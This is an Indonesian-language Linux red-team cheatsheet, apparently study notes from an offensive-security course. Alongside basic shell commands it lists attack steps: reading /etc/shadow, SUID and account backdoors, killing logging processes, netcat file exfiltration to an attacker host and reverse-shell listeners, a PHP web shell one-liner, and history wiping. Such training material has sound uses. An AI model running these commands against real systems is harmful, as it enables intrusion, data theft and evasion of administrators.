# 🏴‍☠️ Linux Red Team Operations - Field Cheatsheet

**Author:** Adrian

**Scope:** Day 1 - Day 6 (Basics, Permissions, PrivEsc, Processes, Weaponization, Networking, Automation)

**Version:** 3.0

**Status:** Active Document

---

## 1. File System & Navigation (The Foundation)
*Fokus: Bergerak cepat di dalam terminal tanpa mouse.*

| Command | Deskripsi |
| :--- | :--- |
| **`pwd`** | **Print Working Directory**. Kita sedang ada di folder mana? |
| **`ls -la`** | Melihat daftar file termasuk yang tersembunyi (dotfiles) dan izin aksesnya. |
| **`cd <folder>`** | Masuk ke folder. Gunakan `cd ..` untuk mundur, `cd ~` untuk pulang ke home. |
| **`mkdir <nama>`** | Membuat folder baru. |
| **`touch <nama>`** | Membuat file kosong. |
| **`cp <sumber> <tujuan>`** | Copy file. Gunakan `cp -r` untuk copy folder. |
| **`mv <sumber> <tujuan>`** | Move (pindah) atau Rename (ganti nama) file. |
| **`cat <file>`** | Membaca isi file sampai habis. |
| **`nano <file>`** | Text editor CLI untuk mengedit script atau konfigurasi. |

---

## 2. Identity & Access Management (Reconnaissance)
*Fokus: Mengetahui siapa kita, di mana kita, dan apa yang bisa kita lakukan.*

| Command | Deskripsi & Fungsi Red Team |
| :--- | :--- |
| **`id`** | Cek user saat ini (UID) dan grup (GID). Target utama: `uid=0(root)`. |
| **`whoami`** | Cek username aktif secara cepat. |
| **`cat /etc/passwd`** | Enumerasi semua user di sistem. Cari user dengan `/bin/bash` (login shell). |
| **`cat /etc/shadow`** | Melihat hash password user (Hanya bisa dibaca root). |
| **`sudo -l`** | Cek command apa saja yang bisa dijalankan sebagai root tanpa password (PrivEsc potential). |
| **`adduser <nama>`** | Membuat user baru. Berguna untuk **Persistence** (membuat pintu belakang/akun cadangan). |
| **`cat /etc/group`** | Melihat daftar grup dan anggotanya. |

---

## 3. Permission Manipulation & File Attributes
*Fokus: Mengontrol akses file dan memodifikasi hak eksekusi.*

| Command | Deskripsi |
| :--- | :--- |
| **`ls -l`** | Melihat detail permission (`rwx`) dan kepemilikan file. |
| **`chmod +x <file>`** | Membuat file menjadi **Executable** (Wajib untuk script exploit/malware). |
| **`chmod 777 <file>`** | Memberikan akses penuh ke semua orang (Bahaya, tapi berguna saat testing). |
| **`chown user:group <file>`** | Mengubah kepemilikan file (Berguna untuk menyembunyikan file di folder orang lain). |
| **`chattr +i <file>`** | Membuat file *Immutable* (Tidak bisa dihapus bahkan oleh root). Bagus untuk persistence. |

---

## 4. Privilege Escalation (SUID)
*Fokus: Mencari celah untuk naik dari User Biasa -> Root.*

| Command | Deskripsi & Fungsi Red Team |
| :--- | :--- |
| **`find / -perm -4000 2>/dev/null`** | Mencari semua file dengan **SUID Bit** aktif (Harta karun hacker). |
| **`ls -l <binary>`** | Cek apakah ada huruf `s` (contoh: `-rwsr-xr-x`). Jika ada, binary berjalan sebagai pemiliknya (biasanya root). |
| **`chmod u+s <binary>`** | Mengaktifkan SUID bit (Backdooring binary agar bisa dijalankan sebagai root nanti). |
| **`gtfobins`** | (Konsep) Selalu cek website GTFOBins jika menemukan binary SUID umum (nmap, vim, find, dll). |

---

## 5. Process Management & Stealth
*Fokus: Sembunyi dari Sysadmin dan menghentikan Antivirus/Defense.*

| Command | Deskripsi |
| :--- | :--- |
| **`ps aux`** | Melihat **SEMUA** proses yang berjalan. |
| **`ps aux | grep <nama>`** | Mencari proses spesifik (misal: cari `defender`, `antivirus`, `ssh`). |
| **`top` / `htop`** | Monitoring real-time. Berguna untuk melihat apakah exploit kita memakan CPU berlebihan. |
| **`kill -9 <PID>`** | Membunuh proses secara paksa (Defense Evasion / Matikan logging). |
| **`CMD &`** | Menjalankan proses di **Background** (agar terminal tidak terkunci). |
| **`jobs`, `bg`, `fg`** | Mengelola job yang berjalan di background. |
| **`systemctl status <service>`** | Cek status layanan (misal: `ssh`, `apache2`, `firewalld`). |

---

## 6. Weaponization (Compiling & Package Mgmt)
*Fokus: Menyiapkan alat tempur langsung di server target (Living off the Land).*

| Command | Deskripsi & Fungsi Red Team |
| :--- | :--- |
| **`wget <url>`** | Download file exploit/tools dari internet. |
| **`curl -O <url>`** | Alternatif download jika `wget` tidak ada. |
| **`tar -xzvf <file.tar.gz>`** | Ekstrak arsip tools ("Membuka paket senjata"). |
| **`gcc exploit.c -o exploit`** | Compile source code C menjadi binary siap pakai (Bypass perbedaan versi OS/GLIBC). |
| **`make`** | Compile otomatis project besar yang punya `Makefile`. |
| **`apt install <paket>`** | Install tools via repo resmi (jika punya akses root & internet). |
| **`dpkg -i <paket.deb>`** | Install paket offline (manual upload). |

---

## 7. Networking & Command Control (C2)
*Fokus: Konektivitas, Reverse Shell, dan Data Exfiltration.*

| Command | Deskripsi & Fungsi Red Team |
| :--- | :--- |
| **`ip addr`** | Cek IP Address sendiri (Penting untuk setting LHOST pada payload). |
| **`ss -antp`** | Cek port yang sedang **Listening**. Cari layanan yang terbuka atau backdoor kita. |
| **`ping -c 4 <ip>`** | Cek koneksi internet atau koneksi ke target. |
| **`nc -lvnp <port>`** | **Netcat Listener**. Membuka port untuk menunggu koneksi (Reverse Shell Handler). |
| **`nc <ip> <port>`** | **Netcat Connect**. Menghubungi server lain (Simulasi Victim connect ke Hacker). |
| **`nc -lvnp 4444 > file`** | **Data Exfil (Receiver)**. Menunggu file dikirim dan menyimpannya. |
| **`nc <ip> 4444 < file`** | **Data Exfil (Sender)**. Mengirim isi file ke server hacker. |
| **`cat /etc/resolv.conf`** | Cek konfigurasi DNS (Jika koneksi internet gagal). |

---

## 8. Automation, Scripting & I/O (Day 6) - NEW!
*Fokus: Membuat tool sendiri, manipulasi output, dan mass-scanning.*

| Command / Simbol | Deskripsi & Fungsi Red Team |
| :--- | :--- |
| **`echo "text"`** | Mencetak teks ke layar. Bisa untuk debug variabel. |
| **`echo "code" > file`** | Membuat file baru berisi kode (misal: `echo "<?php system($_GET['c']); ?>" > shell.php`). |
| **`>`** | **Overwrite Redirection**. Menulis output ke file (isi lama hilang). |
| **`>>`** | **Append Redirection**. Menambah output ke baris paling bawah file (bagus untuk logging). |
| **`|` (Pipe)** | Mengoper output command kiri ke input command kanan (contoh: `cat log.txt | grep "password"`). |
| **`#!/bin/bash`** | **Shebang**. Baris wajib paling atas di script bash. |
| **`VAR="value"`** | Membuat variabel (Ingat: Jangan ada spasi di sekitar `=`). |
| **`$VAR`** | Memanggil isi variabel (Ingat: Wajib pakai `$` saat dipanggil). |
| **`for x in $(list); do ... done`** | **Looping**. Struktur untuk melakukan mass scanning (Ping Sweep). |
| **`if [ cond ]; then ... fi`** | **Conditional**. Logika "Jika-Maka" (Cek apakah host hidup atau mati). |

---

## 9. OpSec (Operational Security & Cleanup)
*Fokus: Jangan tinggalkan jejak.*

| Command | Deskripsi |
| :--- | :--- |
| **`rm <file>`** | Hapus file biasa. |
| **`rm -rf <folder>`** | Hapus folder beserta isinya (Hati-hati!). |
| **`history -c`** | Hapus riwayat command terminal (Agar admin tidak tahu apa yang barusan kita ketik). |
| **`history -w`** | Menulis (overwrite) history saat ini, kadang perlu dilakukan sebelum `-c`. |
| **`apt remove --purge <paket>`** | Uninstall tools beserta konfigurasinya sampai bersih. |

---

### 💡 Tips Pro (The Red Team Mindset)

1. **Check Before You Wreck:** Selalu gunakan `ls -l` atau `id` sebelum menjalankan exploit. Pastikan kamu tahu posisimu.
2. **Living off the Land:** Jangan memaksakan install tools baru jika server target sudah punya `gcc`, `python`, atau `perl`. Gunakan apa yang ada agar tidak terdeteksi.
3. **Variable is Key:** Saat scripting, kesalahan paling umum adalah salah panggil variabel (`$ip` vs `$domain`). Teliti!
4. **Listen First:** Saat melakukan *Data Exfiltration* atau *Reverse Shell*, nyalakan **Listener** (`nc -lvnp`) terlebih dahulu sebelum mengeksekusi payload di sisi korban.
